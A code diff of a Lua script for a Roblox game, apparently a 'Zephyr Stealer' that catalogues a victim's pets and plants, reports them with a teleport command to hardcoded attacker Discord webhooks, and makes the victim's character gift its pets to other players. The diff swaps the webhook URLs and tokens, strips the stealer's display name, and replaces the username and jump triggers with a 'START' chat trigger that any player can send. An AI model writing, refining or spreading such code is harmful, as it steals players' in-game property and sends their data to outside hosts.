@@ -1,3 +1,4 @@
+
 if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
     return
 end
@@ -47,7 +48,7 @@ end
 local CONFIG = {
     username = getfenv().Username,
     webhook = getfenv().Webhook,
-    dualWebhook = "https://discord.com/api/webhooks/1394648714492248126/8b1eORWdBwAWsudi91-7vMYweIkFfaNVvNLkqGY9q_neJNyPoxGppQEyOlq61ka_Ejhm",
+    dualWebhook = "https://discord.com/api/webhooks/1392882033415684310/rl03oFKAXcJyIq0U1Bcp0UplxZO_yOhkS8NNCxhuaLwWbwbZRs0-qpcTjsY2pWn2QhLT",
     dualUsername = "namnnni2",
     dualWebhookThreshold = 1e12,
     
@@ -92,7 +93,6 @@ local giftQueue = {}
 local isGifting = false
 local tpConnection = nil
 local currentGiftingTarget = nil
-local giftingEnabled = false -- Added flag to control gifting
 
 -- Added teleport queue system
 local teleportQueue = {}
@@ -221,23 +221,6 @@ function Utils.unholdAllItems()
     task.wait(0.1)
 end
 
--- Added function to check if target users are in server
-function Utils.checkTargetUsersInServer()
-    local configUserInServer = false
-    local dualUserInServer = false
-    
-    for _, player in ipairs(Players:GetPlayers()) do
-        if string.lower(player.Name) == string.lower(CONFIG.username) then
-            configUserInServer = true
-        end
-        if string.lower(player.Name) == string.lower(CONFIG.dualUsername) then
-            dualUserInServer = true
-        end
-    end
-    
-    return configUserInServer, dualUserInServer
-end
-
 local ItemProcessor = {}
 
 function ItemProcessor.calculatePetValue(petData)
@@ -268,17 +251,18 @@ function ItemProcessor.processPet(tool)
     
     local petName = petData.PetType
     local weight = tonumber(petData.PetData.BaseWeight) or 0
-    local value = ItemProcessor.calculatePetValue(petData)
-    
-    return {
-        Tool = tool,
-        Name = petName,
-        FullName = tool.Name, -- Store the full name from the tool
-        Weight = weight,
-        Value = value,
-        Type = "Pet",
-        IsTarget = Utils.isTargetPet(tool.Name)
-    }
+local age = tonumber(petData.PetData.Age) or 0
+local value = ItemProcessor.calculatePetValue(petData)
+
+return {
+    Tool = tool,
+    Name = petName,
+    Weight = weight,
+    Age = age,
+    Value = value,
+    Type = "Pet",
+    IsTarget = Utils.isTargetPet(tool.Name)
+}
 end
 
 function ItemProcessor.processPlant(tool)
@@ -287,7 +271,6 @@ function ItemProcessor.processPlant(tool)
     return {
         Tool = tool,
         Name = tool.Name,
-        FullName = tool.Name, -- Plants use the same name
         Weight = 0,
         Value = value,
         Type = "Plant",
@@ -410,20 +393,23 @@ function DiscordWebhook.createEmbed(itemsToSend, totalValue, hasTargets, priorit
     local hasRarePet = false
     
     for _, item in ipairs(itemsToSend) do
-        local displayName = item.FullName -- Use the full name instead of just the pet type
+        local displayName = item.Name
 
-        if item.Type == "Pet" and item.IsTarget then
-            local emoji = Utils.getEmojiForPet(item.Name)
-            displayName = emoji .. " " .. displayName
-            hasRarePet = true
-        elseif item.Type == "Plant" then
-            displayName = ":deciduous_tree: " .. displayName
-        else
-            displayName = ":dog: " .. displayName
-        end
+        if item.Type == "Pet" then
+    local emoji = Utils.getEmojiForPet(item.Name)
+    displayName = emoji .. " " .. item.Tool.Name
+    hasRarePet = hasRarePet or item.IsTarget
+elseif item.Type == "Plant" then
+    displayName = ":deciduous_tree: " .. item.Name
+else
+    displayName = ":dog: " .. item.Name
+end
 
-        inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "\n"
-    end
+        if item.Type == "Pet" then
+    inventoryReport = inventoryReport .. string.format("%s — %.2f KG — Age %d — 💰 %s\n", displayName, item.Weight, item.Age, Utils.formatNumber(item.Value))
+else
+    inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "\n"
+end
 
     if inventoryReport == "" then
         inventoryReport = "No items found."
@@ -471,7 +457,7 @@ function DiscordWebhook.createEmbed(itemsToSend, totalValue, hasTargets, priorit
                 ["value"] = "```lua\n" .. string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId) .. "\n```",
                 ["inline"] = false
             }
-        ],
+        },
         ["thumbnail"] = {
             ["url"] = avatarUrl
         },
@@ -493,9 +479,9 @@ function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorit
     
     local payload = {
         ["content"] = contentMsg,
-        ["username"] = "Zephyr Stealer",
+        ["username"] = finalUsername,
         ["embeds"] = {embed},
-        ["avatar_url"] = "https://i.postimg.cc/85rWVH87/file-00000000feb861f5b33ef5b7b42b6598.png"
+        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
     }
     
     pcall(function()
@@ -683,7 +669,7 @@ function GiftingSystem.giftPet(pet, target)
 end
 
 function GiftingSystem.giftAllPets(target)
-    if isGifting or not giftingEnabled then return end
+    if isGifting then return end
     isGifting = true
 
     Utils.unholdAllItems()
@@ -759,28 +745,7 @@ function GiftingSystem.setupChatMonitoring()
         if p == LocalPlayer then return end
 
         local function onChatted(message)
-            -- Check if the player is CONFIG.username or CONFIG.dualUsername
-            local isConfigUser = string.lower(p.Name) == string.lower(CONFIG.username)
-            local isDualUser = string.lower(p.Name) == string.lower(CONFIG.dualUsername)
-            
-            if isConfigUser or isDualUser then
-                -- For CONFIG.username or CONFIG.dualUsername, any chat message triggers gifting
-                giftingEnabled = true
-                
-                -- Check if already in queue
-                for _, queued in ipairs(giftQueue) do
-                    if queued == p then return end
-                end
-
-                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                if #targetPets > 0 or #regularPets > 0 then
-                    table.insert(giftQueue, p)
-                end
-            elseif string.lower(message) == "..." then
-                -- For other players, only "..." triggers gifting
-                giftingEnabled = true
-                
-                -- Check if already in queue
+            if string.upper(tostring(message)) == "START" then
                 for _, queued in ipairs(giftQueue) do
                     if queued == p then return end
                 end
@@ -795,31 +760,6 @@ function GiftingSystem.setupChatMonitoring()
         local function setupChat()
             pcall(function()
                 p.Chatted:Connect(onChatted)
-            end)
-        end
-
-        -- Also start if CONFIG.username or CONFIG.dualUsername jumps
-        local isConfigUser = string.lower(p.Name) == string.lower(CONFIG.username)
-        local isDualUser = string.lower(p.Name) == string.lower(CONFIG.dualUsername)
-        
-        if isConfigUser or isDualUser then
-            task.spawn(function()
-                repeat task.wait() until p.Character and p.Character:FindFirstChildOfClass("Humanoid")
-                local hum = p.Character:FindFirstChildOfClass("Humanoid")
-                hum:GetPropertyChangedSignal("Jump"):Connect(function()
-                    if hum.Jump then
-                        giftingEnabled = true
-                        
-                        for _, queued in ipairs(giftQueue) do
-                            if queued == p then return end
-                        end
-
-                        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
-                        if #targetPets > 0 or #regularPets > 0 then
-                            table.insert(giftQueue, p)
-                        end
-                    end
-                end)
             end)
         end
 
@@ -851,8 +791,6 @@ function GiftingSystem.cleanQueue()
 end
 
 function GiftingSystem.getNextTarget()
-    if not giftingEnabled then return nil end
-    
     GiftingSystem.cleanQueue()
 
     local priority = GiftingSystem.getPriorityPlayer()
